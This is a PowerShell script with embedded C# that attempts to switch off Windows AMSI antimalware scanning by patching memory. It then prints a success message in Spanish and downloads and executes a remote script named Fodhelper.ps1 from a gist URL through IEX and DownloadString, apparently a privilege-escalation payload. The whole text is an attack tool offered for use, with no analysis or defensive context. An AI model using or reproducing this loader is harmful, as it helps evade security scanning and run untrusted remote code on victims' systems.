$code = @'
using System;
using System.Runtime.InteropServices;
using System.Reflection;
public class AmsiBypass {
    [DllImport("amsi.dll")]
    private static extern IntPtr AmsiInitialize([MarshalAs(UnmanagedType.LPWStr)] string szVersion, out Guid phAmsiContext);
    [DllImport("amsi.dll")]
    private static extern int AmsiScanBuffer(IntPtr amsiContext, IntPtr amsiBuf, [MarshalAs(UnmanagedType.LPWStr)] string szBufferName, out IntPtr amsiResult);
    public static void Bypass() {
        Guid guid;
        IntPtr ctx = AmsiInitialize("v2.0.0.0", out guid);
        IntPtr p = Marshal.ReadIntPtr(ctx, 0);
        IntPtr p2 = Marshal.ReadIntPtr(p, 0);
        Marshal.WriteInt32(p2, 1);
    }
}
'@
Add-Type -TypeDefinition $code
[AmsiBypass]::Bypass()
Write-Host "[+] AMSI bypass aplicado" -ForegroundColor Green
IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/raullognext-debug/e29f7ebc348a265c92d27fce395fdf5e/raw/9df68f0935aca537d60349c121134aaec9687c55/Fodhelper.ps1')   
